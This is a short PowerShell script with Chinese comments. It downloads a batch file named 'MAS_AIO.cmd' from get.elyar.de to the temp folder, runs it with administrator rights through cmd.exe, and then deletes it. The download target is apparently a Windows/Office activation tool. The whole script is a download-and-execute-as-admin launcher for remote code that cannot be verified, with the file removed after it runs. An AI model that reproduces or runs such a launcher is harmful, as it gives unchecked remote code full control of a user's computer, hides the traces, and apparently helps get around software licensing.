# 忽略这一行注释，确保编码没问题

# 1. 强制 TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. 临时文件路径
$f = "$env:TEMP\mas_run.cmd"

# 3. 直接下载 (不使用变量，直接填网址，避免任何赋值错误)
Write-Host "正在下载..." -ForegroundColor Cyan
try {
    Invoke-RestMethod "https://get.elyar.de/MAS_AIO.cmd" -OutFile $f
} catch {
    # 如果上面失败 (兼容旧系统)，用备用方式再试一次
    (New-Object System.Net.WebClient).DownloadFile("https://get.elyar.de/MAS_AIO.cmd", $f)
}

# 4. 运行
if (Test-Path $f) {
    Start-Process cmd.exe "/c $f $args" -Verb RunAs -Wait
    Remove-Item $f -Force
} else {
    Write-Host "下载失败，请检查网络。" -ForegroundColor Red
}
